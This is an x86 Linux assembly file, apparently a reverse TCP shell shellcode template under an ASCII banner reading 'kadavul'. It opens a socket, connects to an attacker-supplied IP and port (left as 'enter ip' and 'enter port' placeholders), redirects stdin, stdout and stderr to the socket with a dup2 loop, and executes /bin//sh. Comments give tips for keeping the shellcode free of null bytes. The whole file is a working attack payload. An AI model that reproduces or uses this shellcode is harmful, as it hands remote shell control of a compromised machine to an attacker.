;=============================================
;  _                _                       _ 
; | |              | |                     | |
; | | __  __ _   __| |  __ _ __   __ _   _ | |
; | |/ / / _` | / _` | / _` |\ \ / /| | | || |
; |   < | (_| || (_| || (_| | \ V / | |_| || |
; |_|\_\ \__,_| \__,_| \__,_|  \_/   \__,_||_|
;                                        
;=============================================


global _start

section .text
;[NOTE]:syscall values from /usr/include/i386-linux/gnu/asm/unistd_32.h
_start:
;clear registers
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
;create stack frame :)
mov ebp,esp
;padding======
push edx
push edx 
;padding======

;struct sock_addr_in----------------                        
push word ;enter ip      ;ip   [NOTE]: be careful of null bytes in ip address :)     
;in case of nullbytes use ======================
;xor hex(ip) with another hex(A)  -> hex(B)=hex(ip) xor hex(A) [ hex(A) and hex(B) should be null free]
;[operations like add and sub can also be used< xor is used coz xor ing is fast ;)>]
;mov eax, ;hex(B)                                          
;xor eax, ;hex(A)                                              
;push eax ;:)                                                 
;===============================================
push word ;enter port    ;Port       
push word  0x02          ;AF_INET ipv4 <family>
;struct pushed to stack-------------

;call socket fn and create fd <socket syscall>
;c code -> int sock_fd=socket(AF_INET,SOCK_STREAM,0);
xor eax,eax ;clear registers
mov ebx,eax ;clear registers
mov ax,0x167 ;socket fn call
mov bl,0x02  ;AF_INET
mov cl,0x01  ;SOCK_STREAM
int 0x80
mov ebx,eax  ;socket fd

 ;call connect fn <connect syscall>
 ;c code ->cli_addr -> struct sockaddr_in 
 ;connect(sock_fd,(struct sock_addr)*&cli_addr,sizeof(cli_addr));
mov ax,0x16a ;call socketconnect
mov ecx,esp   ; move stack pointer to reference the struct
mov edx,ebp   ;move base pointer to register
sub edx,ecx   ;sub base pointer from stack pointer to get size of struct
int 0x80

;duplicate fd of STDIN,STDOUT,STDERR
;call dup2
;xor eax,eax ;clear register <eax xorded in loop implementation>
xor ecx,ecx  ;clear register
;mov al,0x3f  ;dup2 sys call
;ebx->fd of socket :)
;mov cl,0x2 ; STDERR
;int 0x80
;mov al,0x3f
;mov cl,0x1 ; STDOUT
;int 0x80
;mov al,0x3f
;mov cl,0x0 ; STDIN

;==create loop to itrate fn call==
mov cl,0x3  ; set iter value
dup2:        ;label loop
xor eax,eax
mov al,0x3f 
dec cl
int 0x80
jnz dup2 ;jump not zero operation :)

;spawn shell :)
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

push eax
push 0x68732f2f ;/bin//sh
push 0x6e69622f
mov ebx,esp  ;move stack pointer to pass reference to "/bin//sh"
mov al,0xb   ;execve syscall :)
int 0x80

